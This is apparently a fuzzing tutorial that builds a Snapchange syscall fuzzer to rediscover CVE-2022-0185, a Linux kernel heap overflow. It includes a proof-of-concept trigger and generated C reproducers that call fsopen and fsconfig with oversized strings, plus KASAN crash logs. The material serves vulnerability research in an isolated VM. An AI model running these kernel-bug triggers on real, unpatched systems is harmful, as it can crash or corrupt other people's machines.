# Example 4 - Syscall fuzzing

In this example, we will implement a basic syscall fuzzer targeting [CVE-2022-0185](https://www.willsroot.io/2022/01/cve-2022-0185.html).

The fuzzer in this example will:

    * Create a random set of syscalls
    * Manually assemble the syscalls into assembly
    * Generate a C file that can be used to reproduce the vulnerability

Let's begin by creating a simple harnesss to execute arbitrary assembly instructions.

_There is an included `./make_example.sh` script to build and snapshot this example. This script
goes through each of the steps described below._

## Harness

The harness for this example can be found [here](./syscall_harness/src/main.rs).

The goal of the harness is to provide a memory buffer that will execute assembly instructions. Syscall arguments can be references to 
memory containing relevant information such as `struct`s or `string`s. The harness also needs to provide scratch memory for the 
fuzzer to fill with data that can be passed to the syscalls.

The harness begins by allocating a `read`/`write` buffer which the fuzzer will use as scratch memory.

```rust
// Scratch space for writing structures
let scratch = unsafe {
    libc::mmap(
        std::ptr::null_mut(),
        SCRATCH_SIZE,
        libc::PROT_READ | libc::PROT_WRITE,
        libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
        -1,
        0,
    )
} as usize;

// Clear the data in the scratch memory
let data = [0x0; SCRATCH_SIZE];

unsafe {
    std::ptr::copy(data.as_ptr(), scratch as *mut u8, SCRATCH_SIZE);
}
```

The harness then allocates a `read`/`write`/`exec` buffer which the fuzzer will populate with the assembly instructions
used to call the syscalls for a given test case.

```rust
  let shellcode = unsafe {
      libc::mmap(
          std::ptr::null_mut(),
          SHELLCODE_SIZE,
          libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
          libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
          -1,
          0,
      )
  } as usize;

  // Always return from the shellcode
  let data = [0xc3; SHELLCODE_SIZE];

  unsafe {
      std::ptr::copy(data.as_ptr(), shellcode as *mut u8, SHELLCODE_SIZE);
  }
```

Note that the shellcode buffer is populated with `ret` instructions (byte `0xc3`). This will force the called function to return immediately
after a test case has executed. The fuzzer can watch for this instruction to know when to reset the guest.

The harness writes the buffer addresses and sizes for the fuzzer to know where to inject its data into the guest.

```rust
    println!("SNAPSHOT: Scratch memory {scratch:#x} Length: {SCRATCH_SIZE:#x}");
    println!("SNAPSHOT: Shellcode: {shellcode:#x} Length: {SHELLCODE_SIZE:#x}");
```

Lastly, the harness executes the `qemu_snapshot` mechanism (`int 0x3 ; vmcall`) so that a snapshot is taken directly before
calling the shellcode buffer to begin executing the test case.

```rust
unsafe {
    // Use the qemu_snapshot trigger
    std::arch::asm!("int 0x3 ; vmcall");

    // Call the shellcode
    let func: extern "C" fn() = std::mem::transmute(shellcode);
    func();
};
```

This binary can then be built and executed using `qemu_snapshot`. 

## Snapshot

The `qemu_snapshot` project is how we will take a snapshot for this project. Briefly, the
project will build a Linux kernel, a patched QEMU which enables snapshotting via
`vmcall` instruction, and a Debian disk with the target binary running during boot under
`gdb`.

The fuzzer template included in snapchange contains scripts that facilitates:

    * Building the harness for a target
    * Taking a snapshot of the harness using `qemu_snapshot`
    * Generating a fuzzer.rs template, filling in information for this specific snapshot
    * Generating coverage breakpoints using `bn_snapchange.py` (or radare2)

Copy the fuzzer template (containing `qemu_snapshot`) and target source code from Snapchange as this example's repository:

```sh
$ cp -r -L <snapchange_dir>/fuzzer_template snapchange-example-04
$ cd snapchange-example-04
$ cp -r <snapchange_dir>/examples/04_syscall_fuzzer/syscall_harness .
```

Add snapchange path as a dependency:

```sh
$ cargo add snapchange --path <snapchange_dir>
```

Modify the `snapchange-example-04/create_snapshot.sh` to build and use the example1 binary.

```sh
# Build the harness for this target
build_harness() {
  if [ ! -f ./syscall_harness/target/release/syscall_harness ]; then
    pushd syscall_harness
    cargo build -r
    popd
  fi
}
```

```sh
# Take the snapshot
take_snapshot() {
  # Build the image to execute the harness on start
  pushd ./qemu_snapshot/IMAGE
  ./build.sh ../../syscall_harness/target/release/syscall_harness
  popd

  # Take the snapshot
  pushd ./qemu_snapshot
  ./snapshot.sh
  popd
}
```

Execute the `./create_snapshot.sh` script to build and take the snapshot of the target.

```sh
./create_snapshot.sh
```

## Memory allocation and calling syscalls

The generator for this example will create a set of random syscalls with random arguments. It will then assemble and write the assembly 
instructions to call these generated syscalls as well as populate scratch memory with the generated arguments if they cannot be directly 
passed in a register.

Each generated syscall will be called using the following instructions (based on the number of arguments a syscall needs):

A syscall with `5` arguments will be called like this:

```text
mov r8,  ARG5
mov r10, ARG4
mov rdx, ARG3
mov rsi, ARG2
mov rdi, ARG1
mov rax, SYSCALL_NUMBER
syscall
mov r15, SCRATCH_MEMORY
mov [r15], rax
```

A syscall with `2` arguments will be called like this:

```text
mov rsi, ARG2
mov rdi, ARG1
mov rax, SYSCALL_NUMBER
syscall
mov r15, SCRATCH_MEMORY
mov [r15], rax
```

The `syscall` arguments are setup in the proper registers. Each argument can be a raw value or a pointer to data. In the case of a pointer,
the pointer is dereferenced before being written into the register.

```text
# Dereference the pointer
mov r15, [pointer_to_data]

# Write the found data into the register for the argument
mov rdi, r15
```

Before being able to write the generated assembly, the fuzzer must keep track of where to write any given assembly instructions. Since memory
never needs to be freed in this harness, a bump allocator is used. The only state needed by the fuzzer is the offset to the next available 
memory address for each buffer. By keeping track of the offset into the shellcode and scratch memories, the fuzzer can easily know where to 
write the next chunk of data.

```rust
#[derive(Default)]
pub struct Example04Fuzzer {
    /// Offset to the next address to write shellcode
    shellcode_offset: u64,

    /// Offset to the next address to allocate for scratch space
    scratch_offset: u64,
}
```

For example, to write given shellcode bytes, the next offset into the `SHELLCODE` buffer (allocated in the harness) is returned. This offset
is then bumped forward by the number of bytes written so that the next shellcode allocation will be at the correct address.

```rust
impl Example04Fuzzer {
    /// Write the given `bytes` into the shellcode allocation in the fuzzvm
    fn write_shellcode(&mut self, fuzzvm: &mut FuzzVm<Self>, bytes: &[u8]) -> Result<()> {
        let addr = self.alloc_shellcode(bytes.len())?;

        fuzzvm.write_bytes_dirty(VirtAddr(addr), CR3, bytes)
    }

    /// Allocate a shellcode address
    fn alloc_shellcode(&mut self, len: usize) -> Result<u64> {
        if self.shellcode_offset >= SHELLCODE_LENGTH {
            return Err(FuzzerError::ShellcodeOutOfMemory.into());
        }

        // Get the current shellcode address
        let res = SHELLCODE + self.shellcode_offset;

        // Update the bump allocator
        self.shellcode_offset += len as u64;

        // Return the shellcode address
        Ok(res)
    }
}
```

The same type of allocator is used for the scratch memory, but this memory is aligned up to the nearest `0x100` byte boundary.

```rust
    /// Write `bytes` into a scratch memory allocation and return the address of the
    /// written to memory
    fn write_scratch(&mut self, fuzzvm: &mut FuzzVm<Self>, bytes: &[u8]) -> Result<u64> {
        let addr = self.alloc_scratch(bytes.len())?;

        fuzzvm.write_bytes_dirty(VirtAddr(addr), CR3, bytes)?;

        Ok(addr)
    }

    /// Allocate a shellcode address
    fn alloc_scratch(&mut self, len: usize) -> Result<u64> {
        if self.scratch_offset >= SCRATCH_LENGTH {
            return Err(FuzzerError::ScratchOutOfMemory.into());
        }

        // Get the current shellcode address
        let res = SCRATCH + self.scratch_offset;

        // Round to the nearest 0x100 for this allocation
        let size = (len as u64 + 0x100) & !0xff;

        // Update the bump allocator
        self.scratch_offset += size as u64;

        // Return the shellcode address
        Ok(res)
    }
```

Lastly, a few helper functions for generating the set of assembly instructions for each number of arguments are nice to have. Here,
the fuzzer can pass in a `syscall` number and `2` arguments along with the current `FuzzVm` and it will write the necessary
assembly into the guest to create this syscall.

```rust
    /// Write a `syscall` with five arguments to the shellcode buffer returning the memory address
    /// holding the return value
    fn syscall_5(
        &mut self,
        fuzzvm: &mut FuzzVm<Self>,
        syscall: u64,
        arg1: Argument,
        arg2: u64,
        arg3: u64,
        arg4: u64,
        arg5: u64,
    ) -> Result<Argument> {
        match arg1 {
            Argument::Raw(arg1) => {
                self.write_shellcode(fuzzvm, &mov_into_rdi(arg1))?;
            }
            Argument::Pointer(ptr) => {
                self.write_shellcode(fuzzvm, &mov_into_r15(ptr))?;
                self.write_shellcode(fuzzvm, &deref_r15_into_rdi())?;
            }
        }

        self.write_shellcode(fuzzvm, &mov_into_rsi(arg2))?;
        self.write_shellcode(fuzzvm, &mov_into_rdx(arg3))?;
        self.write_shellcode(fuzzvm, &mov_into_r10(arg4))?;
        self.write_shellcode(fuzzvm, &mov_into_r8(arg5))?;
        self.write_shellcode(fuzzvm, &mov_into_rax(syscall))?;
        self.write_shellcode(fuzzvm, &asm_syscall())?;

        // Set the return address into a scratch memory address
        let ret_addr = self.alloc_scratch(8)?;
        self.write_shellcode(fuzzvm, &mov_into_r15(ret_addr))?;
        self.write_shellcode(fuzzvm, &mov_mem_r15_from_rax())?;

        // Return the memory holding the return value
        Ok(Argument::Pointer(ret_addr))
    }
```

_Note: for simplicity of this example, only `arg1` is ever a pointer for any syscall. For a more complete fuzzer, each argument for all syscalls 
should be able to take an `Argument` and assembled as such_

For example, the following call to create a `5` argument syscall with sycall number `0x123` with arg1 as pointer `0x12340000` and
raw values `2`, `3`, `4`, `5`.

```rust
self.syscall_5(fuzzvm, 0x123, Argument::Pointer(0x1234_0000), 2, 3, 4, 5)?;
fuzzvm.print_disasm(VirtAddr(SHELLCODE), fuzzvm.cr3(), 0x10)?;
```

Will write the following assembly into the guest:

```text
0x00007ffff72b4000: 49bf0000341200000000     | mov r15, 0x12340000
0x00007ffff72b400a: 498b3f                   | mov rdi, qword ptr [r15]
0x00007ffff72b400d: 48be0200000000000000     | mov rsi, 0x2
0x00007ffff72b4017: 48ba0300000000000000     | mov rdx, 0x3
0x00007ffff72b4021: 49ba0400000000000000     | mov r10, 0x4
0x00007ffff72b402b: 49b80500000000000000     | mov r8, 0x5
0x00007ffff72b4035: 48b82301000000000000     | mov rax, 0x123
0x00007ffff72b403f: 0f05                     | syscall
0x00007ffff72b4041: 49bf00403bf7ff7f0000     | mov r15, 0x7ffff73b4000
0x00007ffff72b404b: 498907                   | mov qword ptr [r15], rax
```

If needed later, the return value from this function is stored in `0x7ffff73b4000`.

With allocation in place, we can now look at the vulnerability we want to replicate to know which syscalls we want to generate.

## Syscall generation

The proof of concept that we are looking to emulate is below (from the [reference](https://www.willsroot.io/2022/01/cve-2022-0185.html)).
The only difference is we will be opening `debugfs` instead of `9p` for this example.

```c
int main(void)
{
        char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        int fd = 0;
        fd = fsopen("debugfs", 0);
        if (fd < 0) {
                puts("Opening");
                exit(-1);
        }

        for (int i = 0; i < 5000; i++) {
                fsconfig(fd, FSCONFIG_SET_STRING, "\x00", val, 0);
        }
        return 0;
}
```

There are only two syscalls needed to trigger the vulnerability: `fsopen` and `fsconfig`.

Let's begin with creating the set of available syscalls along with their arguments:

```rust
/// A collection of generated [`Syscall`]s
#[derive(Debug, Clone, Hash, Eq, PartialEq, Default, Serialize, Deserialize)]
pub struct Syscalls {
    data: Vec<Syscall>,
}

/// A returned file descriptor from `fsopen`
#[derive(Debug, Clone, Hash, Eq, PartialEq, Serialize, Deserialize)]
struct FileDescriptor(usize);

/// The only FsConfig command we currently support
#[derive(Debug, Copy, Clone, Hash, Eq, PartialEq, Serialize, Deserialize)]
#[repr(u64)]
enum FsConfigCommand {
    SetString = 1,
}

/// Possible syscalls that can be generated
#[derive(Debug, Clone, Hash, Eq, PartialEq, Serialize, Deserialize)]
enum Syscall {
    Noop,
    FsOpen {
        fs_name: String,
        flags: u64,
        ret: FileDescriptor,
    },
    FsConfig {
        fs_fd: FileDescriptor,
        cmd: FsConfigCommand,
        key: Vec<u8>,
        val: Vec<u8>,
        aux: u64,
    },
}
```

We can now implement the `generate` function for `Syscalls` to generate a random testcase.

```rust
impl snapchange::FuzzInput for Syscalls {
    /// Generate a random version of this type
    fn generate(
        _corpus: &[Self],
        rng: &mut Rng,
        _dictionary: &Option<Vec<Vec<u8>>>,
        _max_length: usize,
    ) -> Self {
        let mut res = Vec::new();

        // Begin by always opening up debugfs
        res.push(Syscall::FsOpen {
            fs_name: "debugfs".to_string(),
            flags: 0,
            ret: FileDescriptor(0),
        });

        // Create some random number of `fsconfig` syscall with random `key` and `value` pairs
        for _ in 0..rng.next() % 100 {
            res.push(Syscall::FsConfig {
                fs_fd: FileDescriptor(0),
                cmd: FsConfigCommand::SetString,
                key: vec![rng.next() as u8; rng.next() as usize % 128],
                val: vec![b'A'; rng.next() as usize % 128],
                aux: 0,
            });
        }

        Syscalls { data: res }
    }
}
```

For simplicity, this setup will only generate syscalls and will not mutate existing sets of syscalls. 
Instead, each mutation step will generate a new set of syscalls.

```rust
impl snapchange::FuzzInput for Syscalls {
    fn mutate(
        input: &mut Self,
        corpus: &[Self],
        rng: &mut Rng,
        dictionary: &Option<Vec<Vec<u8>>>,
        max_length: usize,
        _max_mutations: usize
    ) {
        *input = Syscalls::generate(corpus, rng, dictionary, max_length);
    }
}
```

(As an exercise for the reader, how could this mutation function be changed to only mutate the `key` values of the `FsConfig`
syscalls instead of always generating new syscalls on each iteration?)

With Generation and Mutation done for our custom `Syscalls` structure, the last thing is to give Snapchange the ability
to write/read this structure to/from disk via `from_bytes` and `to_bytes`. We will serialize the structure using `serde_json`:

```rust
impl snapchange::FuzzInput for Syscalls {
    fn from_bytes(bytes: &[u8]) -> Result<Self> {
        Ok(serde_json::from_slice(bytes)?)
    }

    fn to_bytes(&self, output: &mut Vec<u8>) -> Result<()> {
        let res = serde_json::to_string(&self)?;
        output.extend(res.as_bytes());
        Ok(())
    }
}
```

In order to write the generated syscalls into the guest, we can create a `write` function on `Syscalls` which will write everything
into the guest. This function will be called during the `set_input` stage of the fuzzer to setup the guest for this testcase.

```rust
impl Syscalls {
    // Write the current syscalls into the fuzzvm
    fn write(
        &self,
        fuzzvm: &mut FuzzVm<Example04Fuzzer>,
        fuzzer: &mut Example04Fuzzer,
    ) -> Result<()> {
        let mut ret_vals = Vec::new();

        for syscall in &self.data {
            match syscall {
                Syscall::FsOpen { fs_name, flags, ret: _, } => {
                    // Write the fs_name string into scratch memory
                    let fs_name = fuzzer.write_scratch(fuzzvm, fs_name.as_bytes())?;

                    // Use the scratch memory for this syscall
                    let fsopen_ret = fuzzer.syscall_2(fuzzvm, SYS_FSOPEN, fs_name, *flags)?;

                    // Save the file descriptor from this fsopen call for use in the fsconfig calls
                    ret_vals.push(fsopen_ret);
                }
                Syscall::FsConfig { fs_fd, cmd, key, val, aux, } => {
                    // Write the key and val into scratch memory
                    let key = fuzzer.write_scratch(fuzzvm, &key)?;
                    let val = fuzzer.write_scratch(fuzzvm, &val)?;

                    // Get the file descriptor for the fsopen call from the stored pointer
                    let FileDescriptor(index) = fs_fd;
                    let fsopen_ret = ret_vals[*index];

                    // Write the syscall instructions
                    fuzzer.syscall_5(
                        fuzzvm,
                        SYS_FSCONFIG,
                        fsopen_ret,
                        *cmd as u64,
                        key,
                        val,
                        *aux,
                    )?;
                }
                Syscall::Noop => {}
            }
        }

        Ok(())
    }
```

Our generator is now complete, let's plug it into the fuzzer and begin fuzzing!

## Fuzzer implementation

Begin by setting the `FuzzInput` type for this fuzzer as our `Syscalls` struct and setting `START_ADDRESS`
to the `RIP` of the snapshot found in `./snapshot/fuzzvm.qemuregs`.

```rust
impl Fuzzer for Example04Fuzzer {
    type Input = Syscalls;
    const START_ADDRESS: u64 = 0x55555555c698;
```

We begin the fuzzer by initializing a default `Example04Fuzzer`, effectively resetting each of the offsets
to the memory buffers used.

```rust
    fn init_vm(&mut self, _fuzzvm: &mut FuzzVm<Self>) -> Result<()> {
        *self = Self::default();
        Ok(())
    }
```

During `set_input`, we call the `write` function on `Syscalls` which will write all of the necessary structures into scratch memory
and assembly for calling the syscalls into the guest VM.

```rust
    fn set_input(&mut self, input: &Self::Input, fuzzvm: &mut FuzzVm<Self>) -> Result<()> {
        let _ = input.write(fuzzvm, self);
        Ok(())
    }
```

We want to reset the guest immediately after returning from the `call` to the assembly buffer. As a sanity check, we can use the
`project translate` utility to check how many bytes the first instruction requires. This offset from the `START_ADDRESS`
is the instruction that we want to reset on.

```rust
    fn reset_breakpoints(&self) -> Option<&[AddressLookup]> {
        // Reset when we return from the shellcode call
        // The first call instruction is 4 bytes long.
        //
        // $ cargo run -r -- project translate 0x55555555c698 -i 2
        //
        // 0x000055555555c698: ff542408 syscall_harness!_ZN15syscall_harness4main17hc7c15+ | call qword ptr [rsp+0x8]
        // 0x000055555555c69c: 4883c468 syscall_harness!_ZN15syscall_harness4main17hc7c15+ | add rsp, 0x68

        Some(&[AddressLookup::Virtual(
            VirtAddr(Self::START_ADDRESS + 4),
            CR3,
        )])
    }
```

Starting the fuzzer, we can begin to see a few crashes coming in!

```rust
$ cargo run -r -- fuzz -c 2
```

```console
$ ls ./snapshot/crashes

KASAN_WRITE_size_1_legacy_parse_param+0x17f_addr_0xffff88806a70b000
KASAN_WRITE_size_1_legacy_parse_param+0x283_addr_0xffff88806a70b000
KASAN_WRITE_size_2_legacy_parse_param+0x17f_addr_0xffff88806a70b000
KASAN_WRITE_size_3_legacy_parse_param+0x17f_addr_0xffff88806a70b000
KASAN_WRITE_size_4_legacy_parse_param+0x17f_addr_0xffff88806a70b000
KASAN_WRITE_size_5_legacy_parse_param+0x17f_addr_0xffff88806a70b000
KASAN_WRITE_size_6_legacy_parse_param+0x17f_addr_0xffff88806a70b000
```

These crashes are interesting, but we don't currently have a mechanism for reproducing these inputs (the json blobs of the generated syscalls)
in the `qemu_snapshot` for verification. Snapchange allows a fuzzer to hook each found crash via `handle_crash`. In this function, we can write
a small snippet to write the generated `Syscalls` into a `C` file, which can then be compiled and tested in the guest.

# C code generation of crashing inputs

The C code for these syscalls will call each syscall in order. We need to properly format each `Vec<u8>` properly for C to compile.

```rust
/// Return a C file of the syscalls
fn to_c(&self) -> String {
    let mut res = String::new();
    res.push_str(&format!("#include <unistd.h>\n"));
    res.push_str(&format!("#include <sys/syscall.h>\n"));
    res.push_str(&format!("#define SYS_FSOPEN {SYS_FSOPEN}\n"));
    res.push_str(&format!("#define SYS_FSCONFIG {SYS_FSCONFIG}\n"));
    res.push_str(&format!(
        "#define SetString {}\n",
        FsConfigCommand::SetString as u64
    ));
    res.push_str("void main() {\n");
    for syscall in &self.data {
        match syscall {
            Syscall::FsOpen { fs_name, flags, ret, } => {
                res.push_str(&format!(
                    "    int fsopen_ret{} = syscall(SYS_FSOPEN, {fs_name:?}, {flags});\n",
                    ret.0
                ));
            }
            Syscall::FsConfig { fs_fd, cmd, key, val, aux, } => {
                // Create the C string for key to write into the C file
                let mut key_str = String::new();
                for byte in key {
                    if *byte == b'\\' {
                        key_str.push(*byte as char);
                        key_str.push(*byte as char);
                    } else if byte.is_ascii_graphic() {
                        key_str.push(*byte as char);
                    } else {
                        key_str.push_str(&format!("\\x{:02x}", byte));
                    }
                }

                // Create the C string for val to write into the C file
                let mut val_str = String::new();
                for byte in val {
                    if *byte == b'\\' {
                        val_str.push(*byte as char);
                        val_str.push(*byte as char);
                    } else if byte.is_ascii_graphic() {
                        val_str.push(*byte as char);
                    } else {
                        val_str.push_str(&format!("\\x{:02x}", byte));
                    }
                }

                res.push_str(&format!(
                    "    syscall(SYS_FSCONFIG, fsopen_ret{}, {cmd:?}, \"{key_str}\", \"{val_str}\", {aux});\n",
                    fs_fd.0
                ));
            }
            _ => {}
        }
    }
    res.push_str("}");

    res
}
```

This function can then be used in the `handle_crash` trait function for `Example04Fuzzer`.

```rust
fn handle_crash(
    &self,
    input: &Self::Input,
    _fuzzvm: &mut FuzzVm<Self>,
    crash_file: &Path,
) -> Result<()> {
    // Create the output file as the crashing file with a `.c` extension
    let c_path = crash_file.with_extension("c");

    // Write the C file  
    std::fs::write(c_path, input.to_c())?;

    Ok(())
}
```

Re-running the fuzzer, we should now see `.c` files along with the input `json` blobs.

```sh
$ ls ./snapshot/crashes/KASAN_WRITE_size_123_legacy_parse_param+0x17f_addr_0xffff88806a70b000/
16e2a3b33907dfcc                  
16e2a3b33907dfcc.c               
6660a669c5d4998f                  
6660a669c5d4998f.c
```

```c
$ cat ./snapshot/crashes/KASAN_WRITE_size_123_legacy_parse_param+0x17f_addr_0xffff88806a70b000/16e2a3b33907dfcc.c

#include <unistd.h>
#include <sys/syscall.h>
#define SYS_FSOPEN 430
#define SYS_FSCONFIG 431
#define SetString 1
void main() {
    int fsopen_ret0 = syscall(SYS_FSOPEN, "debugfs", 0);
    syscall(SYS_FSCONFIG, fsopen_ret0, SetString, "\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6\xf6", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0);
    syscall(SYS_FSCONFIG, fsopen_ret0, SetString, "*********", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0);
    syscall(SYS_FSCONFIG, fsopen_ret0, SetString, "''''''''''''''''''", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0);
    ...
}
```

```
(ins)$ cat ./snapshot/crashes/KASAN_WRITE_size_123_legacy_parse_param+0x17f_addr_0xffff88806a70b000/16e2a3b33907dfcc

{"data":[{"FsOpen":{"fs_name":"debugfs","flags":0,"ret":0}},{"FsConfig":{"fs_fd":0,"cmd":"SetString","key":[246,246,246,246,246,246,246,246,246,246,246,2
46,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246,246],"val"
:[65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,6
5],"aux":0}},{"FsConfig":{"fs_fd":0,"cmd":"SetString","key":[42,42,42,42,42,42,42,42,42],"val":[65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,
```

We can finally send this `.c` file over to the guest and check if the crash reproduces.

```text
(Terminal 1)

$ cd qemu_snapshot
$ ./utils/start.sh
```

```text
(Terminal 2)
$ cd qemu_snapshot
$ ./utils/scp.sh ../snapshot/crashes/KASAN_WRITE_size_123_legacy_parse_param+0x17f_addr_0xffff88806a70b000/16e2a3b33907dfcc.c
$ ./connect.sh
(Now in the qemu guest)
root@linux:~# gcc 16e2a3b33907dfcc.c -o poc
root@linux:~# ./poc
root@linux:~# exit
```

```text
(Back in Terminal 1)

linux login: [  201.244430] ==================================================================
[  201.244788] BUG: KASAN: slab-out-of-bounds in legacy_parse_param+0x17f/0x330
[  201.244960] Write of size 123 at addr ffff88806403b000 by task poc/281
[  201.245087]
[  201.245427] CPU: 0 PID: 281 Comm: poc Not tainted 5.4.0 #1
[  201.245562] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.0-0-gd239552ce722-prebuilt.qemu.org 04/01/2014
[  201.245912] Call Trace:
[  201.246255]  dump_stack+0x76/0xa0
[  201.246411]  print_address_description.constprop.0+0x36/0x50
[  201.246552]  ? legacy_parse_param+0x17f/0x330
```

Looks like the C poc does reproduce!

(`qemu_snapshot/utils/kill.sh` will kill the panic'ed QEMU guest)

## Minimizing the crashing input

With a crashing input in hand, it might be worthwhile to minimize the input using the `minimize` subcommand. Snapchange provides a `Minimize`
trait which we can add to `Syscalls` to purposefully minimize the generated syscalls.

For this simple case, the minimization strategy will be choosing between the following options:

    * Delete an entire syscall
    * Remove some of the bytes in FsConfig.key or FsCofig.val arguments
    * Change the value of FsConfig.key or FsConfig.val arguments to `0xcd`

Implementing the `Minimize` trait to Syscalls could look like the following:

```rust
impl snapchange::FuzzInput for Syscalls {
    /// Minimize the given `input` based on a minimization strategy
    fn minimize(input: &mut Self, rng: &mut Rng) {
        match rng.next() % 5 {
            0 => {
                // Remove a random syscall
                let num_syscalls = input.data.len();
                let index = rng.next() as usize % num_syscalls;

                // Don't remove the first FsOpen syscall
                if index == 0 {
                    return;
                }

                input.data.remove(index);
            }
            1 => {
                // Minimize a key of a random syscall
                let num_syscalls = input.data.len();
                let mut curr_syscall = &mut input.data[rng.next() as usize % num_syscalls];

                match curr_syscall {
                    Syscall::FsConfig { key, .. } => {
                        let key_len = key.len();
                        if key_len == 0 {
                            return;
                        }

                        let a = rng.gen::<usize>() % key_len;
                        let b = rng.gen::<usize>() % key_len;
                        let (first, second) = if a < b { (a, b) } else { (b, a) };

                        key.splice(first..second, []);
                    }
                    _ => {
                        // Do nothing for any other syscall
                    }
                }
            }
            2 => {
                // Minimize a key of a random syscall
                let num_syscalls = input.data.len();
                let mut curr_syscall = &mut input.data[rng.next() as usize % num_syscalls];

                match curr_syscall {
                    Syscall::FsConfig { val, .. } => {
                        let val_len = val.len();
                        if val_len == 0 {
                            return;
                        }
                        let a = rng.gen::<usize>() % val_len;
                        let b = rng.gen::<usize>() % val_len;
                        let (first, second) = if a < b { (a, b) } else { (b, a) };

                        val.splice(first..second, []);
                    }
                    _ => {
                        // Do nothing for any other syscall
                    }
                }
            }
            3 => {
                // Replace the bytes of a val with 0xcd
                let num_syscalls = input.data.len();
                let mut curr_syscall = &mut input.data[rng.next() as usize % num_syscalls];

                match curr_syscall {
                    Syscall::FsConfig { key, .. } => {
                        let key_len = key.len();
                        if key_len == 0 {
                            return;
                        }

                        key.iter_mut().for_each(|x| *x = 0xcd);
                    }
                    _ => {
                        // Do nothing for any other syscall
                    }
                }
            }
            4 => {
                // Replace the bytes of a val with 0xcd
                let num_syscalls = input.data.len();
                let mut curr_syscall = &mut input.data[rng.next() as usize % num_syscalls];

                match curr_syscall {
                    Syscall::FsConfig { val, .. } => {
                        let val_len = val.len();
                        if val_len == 0 {
                            return;
                        }

                        val.iter_mut().for_each(|x| *x = 0xcd);
                    }
                    _ => {
                        // Do nothing for any other syscall
                    }
                }
            }
            5 => {
                // replace the bytes of a val with 0xcd
                let num_syscalls = input.data.len();
                let mut curr_syscall = &mut input.data[rng.next() as usize % num_syscalls];

                match curr_syscall {
                    Syscall::FsConfig { key, .. } => {
                        let key_len = key.len();
                        if key_len == 0 {
                            return;
                        }

                        key.iter_mut().for_each(|x| *x = 0xcd);
                    }
                    _ => {
                        // do nothing for any other syscall
                    }
                }
            }
            _ => unreachable!(),
        }
    }
}
```

We can now execute this minimization strategy `100000` times over a crashing input to minimize it.

```
cargo run -r -- minimize -i 100000 ./snapshot/crashes/KASAN_WRITE_size_123_legacy_parse_param+0x17f_addr_0xffff88806a70b000/16e2a3b33907dfcc_min_by_size/
```

This will result in a slightly smaller `C` file as well:

```c
#include <unistd.h>
#include <sys/syscall.h>
#define SYS_FSOPEN 430
#define SYS_FSCONFIG 431
#define SetString 1
void main() {
    int fsopen_ret0 = syscall(SYS_FSOPEN, "debugfs", 0);
    syscall(SYS_FSCONFIG, fsopen_ret0, SetString, "\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd", "\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd", 0);
    syscall(SYS_FSCONFIG, fsopen_ret0, SetString, "\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd", "\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd\xcd", 0);
